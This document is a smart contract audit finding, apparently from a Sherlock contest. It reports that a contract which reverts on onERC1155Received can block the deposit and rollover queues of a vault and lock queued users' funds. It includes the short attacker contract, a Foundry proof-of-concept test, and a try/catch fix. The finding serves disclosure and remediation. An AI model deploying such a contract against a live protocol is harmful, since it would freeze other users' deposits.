# malicious contract can DoS queues

## Summary
An attacker can create a contract that reverts on `onERC1155Received`. This will DoS rollover and deposit queues. Most importantly `depositQueue` as that will lock users funds in the contract.

## Vulnerability Detail
Similar to [the gas DoS issue](issue-10) where a malicious contract is deployed and used as a receiver.

When depositing into the queue the user pays upfront then waits for a relayer to mint their deposits into the next epoch.

If the receiver is a contract, minting ERC1155 will call `onERC1155Received` on the receiving contract. An attacker can create a contract that reverts which will revert minting:
```solidity
pragma solidity 0.8.17;

contract QueueDoS {
    function onERC1155Received(address , address , uint256 , uint256 , bytes calldata ) external pure returns (bytes4) {
        revert("no queue for you");
    }
}
```

Since the `depositQueue` really is a stack, this will lock previously queued users funds in the vault.

The same kind of attack can be performed on `rolloverQueue`, with some slight modifications since the attacking contract needs to accept the first minting when depositing.

If the attacker registers this malicious contract early in the `rolloverQueue` it will prevent any subsequent rollovers from happening. The epoch it registers in must be won ofc, but since the cost is low (`relayerFee + 1`), an attacker can simply register this in epochs until that vault wins that epoch. The impact here is however lower as it only prevents rollovers from happening and doesn't lock users funds.

PoC test on `depositQueue` in `CarouselTest.t.sol`:
```solidity
    function testDepositQueueDoS() public {
        uint40 _epochBegin = uint40(block.timestamp + 1 days);
        uint40 _epochEnd = uint40(block.timestamp + 2 days);
        uint256 _epochId = 1;
        vault.setEpoch(_epochBegin, _epochEnd, _epochId);

        QueueDoS attacker = new QueueDoS();
        deal(UNDERLYING,address(attacker),relayerFee + 1, true);

        vm.startPrank(USER);
        IERC20(UNDERLYING).approve(address(vault), 10 ether);
        vault.deposit(0, 10 ether, USER);
        vm.stopPrank();

        vm.startPrank(address(attacker));
        IERC20(UNDERLYING).approve(address(vault), relayerFee +1);
        vault.deposit(0, relayerFee + 1, address(attacker));
        vm.stopPrank();
        
        assertEq(vault.getDepositQueueLenght(),2);

        // deposits cannot be minted
        vm.expectRevert("no queue for you");
        vault.mintDepositInQueue(_epochId, 5);

        // USERs funds locked in vault
        assertEq(vault.balanceOf(USER,_epochId),0);
    }
```

## Impact
DoS on `depositQueue` will lock previously queued users funds in the vault.

DoS on `rolloverQueue` will prevent rollovers that were registered after malicious contract from occurring as the index cannot be updated.

## Tool used
Manual Review

## Recommendation
One way to solve this is to wrap the minting in a try/catch. That wouldn't solve the [gas inflation issue](https://github.com/sherlock-audit/2023-03-Y2K-0ximmeas/issues/10) but it has its own solution discussion.

This solution implies a way for users to [withdraw their queued deposits](issue-12).
